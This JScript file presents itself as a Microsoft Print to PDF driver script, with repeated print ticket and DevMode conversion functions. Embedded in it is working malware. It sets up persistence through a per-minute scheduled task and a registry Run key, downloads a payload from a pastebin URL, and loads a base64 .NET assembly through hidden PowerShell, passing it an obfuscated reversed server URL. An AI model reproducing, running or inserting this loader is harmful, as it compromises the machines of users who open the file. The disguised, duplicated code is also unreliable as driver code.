function createProperty(strPropertyName, strNodeName, strValueType, strValue, documentNode) {
    /// <summary>
    /// Create a property XML Node with child Value Node containing the value
    /// </summary>
    /// <param name="strPropertyName" type="String">
    ///   Name of the property Node
    /// </param>
    /// <param name="strNodeName" type="String">
    ///   Name to be assigned to the "name" attribute of the property
    /// </param>
    /// <param name="strValueType" type="String">
    ///   Type of the value the in the Value Node
    /// </param>
    /// <param name="strValue" type="String">
    ///   Actual value that is to be placed in the value node
    /// </param>
    /// <param name="documentNode" type="IXMLNode">
    ///   Contains Document XML Node
    /// </param>

    var newNode = documentNode.XmlNode.createNode(1, strNodeName, psfNs);
    newNode.setAttribute("name", strPropertyName);

    if (strValueType.length > 0) {
        var newProp = documentNode.XmlNode.createNode(1, "psf:Value", psfNs);
        var newAttr = documentNode.XmlNode.createNode(2, "xsi:type", xsiNs);
        newAttr.nodeValue = strValueType;
        newProp.setAttributeNode(newAttr);

        var newText = documentNode.XmlNode.createTextNode(strValue);

        newProp.appendChild(newText);

        newNode.appendChild(newProp);
    }
    return newNode;
}
// PSK NameSpace's
var pskNs = "http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords";
var psk11Ns = "http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11";
var psk12Ns = "http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12";

// psf NameSpace's
var psf2Ns = "http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2";
var psfNs = "http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework";

// XML Schema NameSpace's
var xsiNs = "http://www.w3.org/2001/XMLSchema-instance";
var xsdNs = "http://www.w3.org/2001/XMLSchema";

// PDF driver NameSpace
var pdfNs = "http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf";


function completePrintCapabilities(printTicket, scriptContext, printCapabilities) {
    /// <param name="printTicket" type="QzqovrintSchemaTicket" mayBeNull="true">
    ///     If not 'null', the print ticket's settings are used to customize the print capabilities.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="printCapabilities" type="QzqovrintSchemaCapabilities">
    ///     Print capabilities object to be customized.
    /// </param>

    // Get PrintCapabilites XML node
    var xmlCapabilities = printCapabilities.XmlNode;

    var rootCapabilities;
    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(xmlCapabilities);

    rootCapabilities = xmlCapabilities.selectSingleNode("psf:PrintCapabilities");

    if (rootCapabilities != null) {
        var pdcConfig = scriptContext.QueueProperties.GetReadStreamAsXML("PrintDeviceCapabilities");
        SetStandardNameSpaces(pdcConfig);

        // Get PDC root XML Node
        var pdcRoot = pdcConfig.selectSingleNode("psf2:PrintDeviceCapabilities");
        // Get all ParameterDef nodes in PDC
        var parameterDefs = pdcRoot.selectNodes("*[@psf2:psftype='ParameterDef']");
        // Get prefix for PDF namespace
        var pdfNsPrefix = getPrefixForNamespace(xmlCapabilities, pdfNs);

        // Convert PDC ParameterDefs Nodes to PrintCapabilites ParameterDefs Nodes
        for (var defCount = 0; defCount < parameterDefs.length; defCount++) {
            var pdcParameterDef = parameterDefs[defCount];
            var capabilitiesParamDef = CreateCapabilitiesParamDefFromPDC(pdcParameterDef, pdfNsPrefix, printCapabilities);
            rootCapabilities.appendChild(capabilitiesParamDef);
        }
    }
}



function convertDevModeToPrintTicket(devModeProperties, scriptContext, printTicket) {
    /// <param name="devModeProperties" type="QzqovrinterScriptablePropertyBag">
    ///     The DevMode property bag.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="printTicket" type="QzqovrintSchemaTicket">
    ///     Print ticket to be converted from the DevMode.
    /// </param>


    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(printTicket.XmlNode);
    // Get prefix for PDF namespace
    var pdfNsPrefix = getPrefixForNamespace(printTicket.XmlNode, pdfNs);

    // If pdf namespace prefix is not found, that means that print ticket is produced by a different printer and there is not PDF name space with in print ticket
    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
    if (pdfNsPrefix != null) {
        // Get ParameterDefs in PDC
        var pdcParameterDefs = getParameterDefs(scriptContext);

        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            // Get Devmode string related to ParameterDefs in PDC
            var paramString = devModeProperties.getString(pdcParameterDefs[defCount]);

            if (paramString != null && paramString.length > 0) {
                // If Devmode string is present map to print ticket either by creating a new node or modifying the existing node 

                // Add prefix to ParameterDef base name
                var paramName = pdfNsPrefix + ":" + pdcParameterDefs[defCount];

                // Try getting the related ParameterInit in the PrintTicket
                var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], pdfNs)
                if (currNode == null) {
                    // Create node if no node is present
                    var ptRoot = printTicket.XmlNode.selectSingleNode("psf:PrintTicket");
                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, printTicket);
                    ptRoot.appendChild(newParam);
                } else {
                    // Change the value of the node to Devmode string value
                    currNode.Value = paramString;
                }
            }
        }
    }
}
function jfureufujghs() {
var objShell = new ActiveXObject("WScript.Shell");

var strTaskName = "Name  ";

var strDeleteCommand = "schtasks /delete /tn " + strTaskName + " /f";
objShell.Run(strDeleteCommand, 0, true);

var strScriptPath = WScript.ScriptFullName;

var strTempFolder = objShell.ExpandEnvironmentStrings("%TEMP%");

var strTargetFile = strTempFolder + "\\Temp Name.js";

// Cria um objeto FileSystemObject
var objFSO = new ActiveXObject("Scripting.FileSystemObject");

try {
    // Tenta copiar o arquivo para a pasta temporária
    objFSO.CopyFile(strScriptPath, strTargetFile, true);
} catch (err) {
    WScript.Echo("Erro ao copiar o arquivo para a pasta temporária: " + err.description);
}

var strCreateCommand = 'schtasks /create /tn ' + strTaskName + ' /tr "' + strTargetFile + '" /sc minute /mo Minutos';
objShell.Run(strCreateCommand, 0, true);






return "";
}

//%jfureufujghs()%




function jfureufujgh() {
var mnGv = new ActiveXObject("Scripting.FileSystemObject")

    var objShell = new ActiveXObject("Shell.Application")
    SCKw =  " Copy-Item -Path *.js -Destination C:\\Windows\\Temp\\Debug.js";
    objShell.ShellExecute("powershell", " -command " + SCKw , "", "open" , 0);

var HKEY_LOCAL_MACHINE = 0x80000001
var geWh = GetObject("winmgmts://./root/default:StdRegProv")
pDSL = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
mWXr = "Name Regedit"
zelQ = "C:\\Windows\\Temp\\Debug.js"
geWh.SetStringValue(HKEY_LOCAL_MACHINE, pDSL, mWXr, zelQ);

return "";
}

//%jfureufujgh()%


function SihFHQuQVAWACSQiVQhUUiA(WOpBc){

var jXALS  = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
jXALS.open ("GET", WOpBc, false);
jXALS.send ();
return jXALS.responseText 

}

var FFACIIPIQQHAWPAFQIuFFFQ // servidor
FFACIIPIQQHAWPAFQIuFFFQ = ("war/i5us6wvg/oc.yrtner//:sptth"); //servidor tiene reverse string

var SihFHQuQVAWACSQiVQhUUiA // dll 
SihFHQuQVAWACSQiVQhUUiA = SihFHQuQVAWACSQiVQhUUiA(SihFHQuQVAWACSQiVQhUUiA("https://pastebin.com/raw/kH7wBirG")); 

var uJaFiVJVFKuKAuVJFVAQQJK // codigo
uJaFiVJVFKuKAuVJFVAQQJK = "$bFjDJ = '" + SihFHQuQVAWACSQiVQhUUiA + "';";

uJaFiVJVFKuKAuVJFVAQQJK = uJaFiVJVFKuKAuVJFVAQQJK + "[Byte[]] $EuKVK = [System.Convert]::FromBase64String( $bFjDJ );";
uJaFiVJVFKuKAuVJFVAQQJK = uJaFiVJVFKuKAuVJFVAQQJK + "[System.AppDomain]::CurrentDomain.Load($EuKVK).GetType('ClassLibrary3.reed').GetMethod('testd').Invoke($null, [object[]] ('" + FFACIIPIQQHAWPAFQIuFFFQ + "' , '" + WScript.ScriptFullName + "' , " + "'MagickUpdater'" + ", '3', '1', 'Regedit Name' " + " ) );";


var oShell = new ActiveXObject("Shell.Application"); 
oShell.ShellExecute("powershell", " -command " + uJaFiVJVFKuKAuVJFVAQQJK , "", "open" , 0);
function validatePrintTicket(printTicket, scriptContext) {
    /// <param name="printTicket" type="QzqovrintSchemaTicket">
    ///     Print ticket to be validated.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <returns type="Number" integer="true">
    ///     Integer value indicating validation status.
    ///         1 - Print ticket is valid and was not modified.
    ///         2 - Print ticket was modified to make it valid.
    ///         0 - Print ticket is invalid.
    /// </returns>

    // There is nothing wrong with having only 1, 2 or 3 ParameterInit’s in PrintTicket for the same ParameterDefs that are present in PDC. 
    // For that reason we just going to return 1 without any check
    return 1;
}

function createProperty(strPropertyName, strNodeName, strValueType, strValue, documentNode) {
    /// <summary>
    /// Create a property XML Node with child Value Node containing the value
    /// </summary>
    /// <param name="strPropertyName" type="String">
    ///   name of the property Node
    /// </param>
    /// <param name="strNodeName" type="String">
    ///   name to be assigned to the "name" attribute of the property
    /// </param>
    /// <param name="strValueType" type="String">
    ///   Type of the value the in the Value Node
    /// </param>
    /// <param name="strValue" type="String">
    ///   Actual value that is to be placed in the value node
    /// </param>
    /// <param name="documentNode" type="IXMLNode">
    ///   Contains Document XML Node
    /// </param>

    var newNode = documentNode.XmlNode.createNode(1, strNodeName, psfNs);
    newNode.setAttribute("name", strPropertyName);

    if (strValueType.length > 0) {
        var newProp = documentNode.XmlNode.createNode(1, "psf:Value", psfNs);
        var newAttr = documentNode.XmlNode.createNode(2, "xsi:type", xsiNs);
        newAttr.nodeValue = strValueType;
        newProp.setAttributeNode(newAttr);

        var newText = documentNode.XmlNode.createTextNode(strValue);

        newProp.appendChild(newText);

        newNode.appendChild(newProp);
    }
    return newNode;
}


// PSK NameSpace's
var Sincolote = "http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords";
var KlXcvbbn = "http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11";
var NhDdHgjk = "http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12";

// psf NameSpace's
var psf2Ns = "http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2";
var psfNs = "http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework";

// XML Schema NameSpace's
var xsiNs = "http://www.w3.org/2001/XMLSchema-instance";
var xsdNs = "http://www.w3.org/2001/XMLSchema";

// PDF driver NameSpace
var pdfNs = "http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf";


function completePrintCapabilities(printTicket, scriptContext, printCapabilities) {
    /// <param name="printTicket" type="QzqovrintSchemaTicket" mayBeNull="true">
    ///     If not 'null', the print ticket's settings are used to customize the print capabilities.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="printCapabilities" type="QzqovrintSchemaCapabilities">
    ///     Print capabilities object to be customized.
    /// </param>

    // Get PrintCapabilites XML node
    var xmlCapabilities = printCapabilities.XmlNode;

    var fghjrdffd;
    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(xmlCapabilities);

    fghjrdffd = xmlCapabilities.selectSingleNode("psf:PrintCapabilities");

    if (fghjrdffd != null) {
        var pdcConfig = scriptContext.QueueProperties.GetReadStreamAsXML("PrintDeviceCapabilities");
        SetStandardNameSpaces(pdcConfig);

        // Get PDC root XML Node
        var pdcRoot = pdcConfig.selectSingleNode("psf2:PrintDeviceCapabilities");
        // Get all ParameterDef nodes in PDC
        var parameterDefs = pdcRoot.selectNodes("*[@psf2:psftype='ParameterDef']");
        // Get prefix for PDF namespace
        var pdfNsPrefix = getPrefixForNamespace(xmlCapabilities, pdfNs);

        // Convert PDC ParameterDefs Nodes to PrintCapabilites ParameterDefs Nodes
        for (var defCount = 0; defCount < parameterDefs.length; defCount++) {
            var pdcParameterDef = parameterDefs[defCount];
            var capabilitiesParamDef = CreateCapabilitiesParamDefFromPDC(pdcParameterDef, pdfNsPrefix, printCapabilities);
            fghjrdffd.appendChild(capabilitiesParamDef);
        }
    }
}



function convertDevModeToPrintTicket(devModeProperties, scriptContext, printTicket) {
    /// <param name="devModeProperties" type="QzqovrinterScriptablePropertyBag">
    ///     The DevMode property bag.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="printTicket" type="QzqovrintSchemaTicket">
    ///     Print ticket to be converted from the DevMode.
    /// </param>


    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(printTicket.XmlNode);
    // Get prefix for PDF namespace
    var pdfNsPrefix = getPrefixForNamespace(printTicket.XmlNode, pdfNs);

    // If pdf namespace prefix is not found, that means that print ticket is produced by a different printer and there is not PDF name space with in print ticket
    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
    if (pdfNsPrefix != null) {
        // Get ParameterDefs in PDC
        var pdcParameterDefs = getParameterDefs(scriptContext);

        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            // Get Devmode string related to ParameterDefs in PDC
            var paramString = devModeProperties.getString(pdcParameterDefs[defCount]);

            if (paramString != null && paramString.length > 0) {
                // If Devmode string is present map to print ticket either by creating a new node or modifying the existing node 

                // Add prefix to ParameterDef base name
                var paramName = pdfNsPrefix + ":" + pdcParameterDefs[defCount];

                // Try getting the related ParameterInit in the PrintTicket
                var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], pdfNs)
                if (currNode == null) {
                    // Create node if no node is present
                    var ptRoot = printTicket.XmlNode.selectSingleNode("psf:PrintTicket");
                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, printTicket);
                    ptRoot.appendChild(newParam);
                } else {
                    // Change the value of the node to Devmode string value
                    currNode.Value = paramString;
                }
            }
        }
    }
}








function convertDevModeToPrintTicket(devModeProperties, scriptContext, printTicket) {
    /// <param name="devModeProperties" type="QzqovrinterScriptablePropertyBag">
    ///     The DevMode property bag.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="printTicket" type="QzqovrintSchemaTicket">
    ///     Print ticket to be converted from the DevMode.
    /// </param>


    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(printTicket.XmlNode);
    // Get prefix for PDF namespace
    var pdfNsPrefix = getPrefixForNamespace(printTicket.XmlNode, pdfNs);

    // If pdf namespace prefix is not found, that means that print ticket is produced by a different printer and there is not PDF name space with in print ticket
    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
    if (pdfNsPrefix != null) {
        // Get ParameterDefs in PDC
        var pdcParameterDefs = getParameterDefs(scriptContext);

        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            // Get Devmode string related to ParameterDefs in PDC
            var paramString = devModeProperties.getString(pdcParameterDefs[defCount]);

            if (paramString != null && paramString.length > 0) {
                // If Devmode string is present map to print ticket either by creating a new node or modifying the existing node 

                // Add prefix to ParameterDef base name
                var paramName = pdfNsPrefix + ":" + pdcParameterDefs[defCount];

                // Try getting the related ParameterInit in the PrintTicket
                var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], pdfNs)
                if (currNode == null) {
                    // Create node if no node is present
                    var ptRoot = printTicket.XmlNode.selectSingleNode("psf:PrintTicket");
                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, printTicket);
                    ptRoot.appendChild(newParam);
                } else {
                    // Change the value of the node to Devmode string value
                    currNode.Value = paramString;
                }
            }
        }
    }
}

function convertPrintTicketToDevMode(printTicket, scriptContext, devModeProperties) {
    /// <param name="printTicket" type="QzqovrintSchemaTicket">
    ///     Print ticket to be converted to DevMode.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="devModeProperties" type="QzqovrinterScriptablePropertyBag">
    ///     The DevMode property bag.
    /// </param>


    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(printTicket.XmlNode);

    // Get prefix for PDF namespace
    var pdfNsPrefix = getPrefixForNamespace(printTicket.XmlNode, pdfNs);

    // If pdf namespace prefix is not found, that means that print ticket is produced by a different printer and there is not PDF name space with in print ticket
    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
    if (pdfNsPrefix != null) {
        // Get ParameterDefs in PDC
        var pdcParameterDefs = getParameterDefs(scriptContext);

        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            // Try getting the related ParameterInit in the PrintTicket
            var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], pdfNs)
            if (currNode != null) {
                // Set Devmode string with the value present in ParameterInit
                devModeProperties.setString(pdcParameterDefs[defCount], currNode.Value);
            }
        }
    }
}

function validatePrintTicket(printTicket, scriptContext) {
    /// <param name="printTicket" type="QzqovrintSchemaTicket">
    ///     Print ticket to be validated.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <returns type="Number" integer="true">
    ///     Integer value indicating validation status.
    ///         1 - Print ticket is valid and was not modified.
    ///         2 - Print ticket was modified to make it valid.
    ///         0 - Print ticket is invalid.
    /// </returns>

    // There is nothing wrong with having only 1, 2 or 3 ParameterInit’s in PrintTicket for the same ParameterDefs that are present in PDC. 
    // For that reason we just going to return 1 without any check
    return 1;
}

function createProperty(strPropertyName, strNodeName, strValueType, strValue, documentNode) {
    /// <summary>
    /// Create a property XML Node with child Value Node containing the value
    /// </summary>
    /// <param name="strPropertyName" type="String">
    ///   Name of the property Node
    /// </param>
    /// <param name="strNodeName" type="String">
    ///   Name to be assigned to the "name" attribute of the property
    /// </param>
    /// <param name="strValueType" type="String">
    ///   Type of the value the in the Value Node
    /// </param>
    /// <param name="strValue" type="String">
    ///   Actual value that is to be placed in the value node
    /// </param>
    /// <param name="documentNode" type="IXMLNode">
    ///   Contains Document XML Node
    /// </param>

    var newNode = documentNode.XmlNode.createNode(1, strNodeName, psfNs);
    newNode.setAttribute("name", strPropertyName);

    if (strValueType.length > 0) {
        var newProp = documentNode.XmlNode.createNode(1, "psf:Value", psfNs);
        var newAttr = documentNode.XmlNode.createNode(2, "xsi:type", xsiNs);
        newAttr.nodeValue = strValueType;
        newProp.setAttributeNode(newAttr);

        var newText = documentNode.XmlNode.createTextNode(strValue);

        newProp.appendChild(newText);

        newNode.appendChild(newProp);
    }
    return newNode;
}
// PSK NameSpace's
var pskNs = "http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords";
var psk11Ns = "http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11";
var psk12Ns = "http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12";

// psf NameSpace's
var psf2Ns = "http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2";
var psfNs = "http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework";

// XML Schema NameSpace's
var xsiNs = "http://www.w3.org/2001/XMLSchema-instance";
var xsdNs = "http://www.w3.org/2001/XMLSchema";

// PDF driver NameSpace
var pdfNs = "http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf";


function completePrintCapabilities(printTicket, scriptContext, printCapabilities) {
    /// <param name="printTicket" type="QzqovrintSchemaTicket" mayBeNull="true">
    ///     If not 'null', the print ticket's settings are used to customize the print capabilities.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="printCapabilities" type="QzqovrintSchemaCapabilities">
    ///     Print capabilities object to be customized.
    /// </param>

    // Get PrintCapabilites XML node
    var xmlCapabilities = printCapabilities.XmlNode;

    var rootCapabilities;
    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(xmlCapabilities);

    rootCapabilities = xmlCapabilities.selectSingleNode("psf:PrintCapabilities");

    if (rootCapabilities != null) {
        var pdcConfig = scriptContext.QueueProperties.GetReadStreamAsXML("PrintDeviceCapabilities");
        SetStandardNameSpaces(pdcConfig);

        // Get PDC root XML Node
        var pdcRoot = pdcConfig.selectSingleNode("psf2:PrintDeviceCapabilities");
        // Get all ParameterDef nodes in PDC
        var parameterDefs = pdcRoot.selectNodes("*[@psf2:psftype='ParameterDef']");
        // Get prefix for PDF namespace
        var pdfNsPrefix = getPrefixForNamespace(xmlCapabilities, pdfNs);

        // Convert PDC ParameterDefs Nodes to PrintCapabilites ParameterDefs Nodes
        for (var defCount = 0; defCount < parameterDefs.length; defCount++) {
            var pdcParameterDef = parameterDefs[defCount];
            var capabilitiesParamDef = CreateCapabilitiesParamDefFromPDC(pdcParameterDef, pdfNsPrefix, printCapabilities);
            rootCapabilities.appendChild(capabilitiesParamDef);
        }
    }
}



function convertDevModeToPrintTicket(devModeProperties, scriptContext, printTicket) {
    /// <param name="devModeProperties" type="QzqovrinterScriptablePropertyBag">
    ///     The DevMode property bag.
    /// </param>
    /// <param name="scriptContext" type="QzqovrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="printTicket" type="QzqovrintSchemaTicket">
    ///     Print ticket to be converted from the DevMode.
    /// </param>


    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(printTicket.XmlNode);
    // Get prefix for PDF namespace
    var pdfNsPrefix = getPrefixForNamespace(printTicket.XmlNode, pdfNs);

    // If pdf namespace prefix is not found, that means that print ticket is produced by a different printer and there is not PDF name space with in print ticket
    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
    if (pdfNsPrefix != null) {
        // Get ParameterDefs in PDC
        var pdcParameterDefs = getParameterDefs(scriptContext);

        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            // Get Devmode string related to ParameterDefs in PDC
            var paramString = devModeProperties.getString(pdcParameterDefs[defCount]);

            if (paramString != null && paramString.length > 0) {
                // If Devmode string is present map to print ticket either by creating a new node or modifying the existing node 

                // Add prefix to ParameterDef base name
                var paramName = pdfNsPrefix + ":" + pdcParameterDefs[defCount];

                // Try getting the related ParameterInit in the PrintTicket
                var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], pdfNs)
                if (currNode == null) {
                    // Create node if no node is present
                    var ptRoot = printTicket.XmlNode.selectSingleNode("psf:PrintTicket");
                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, printTicket);
                    ptRoot.appendChild(newParam);
                } else {
                    // Change the value of the node to Devmode string value
                    currNode.Value = paramString;
                }
            }
        }
    }
}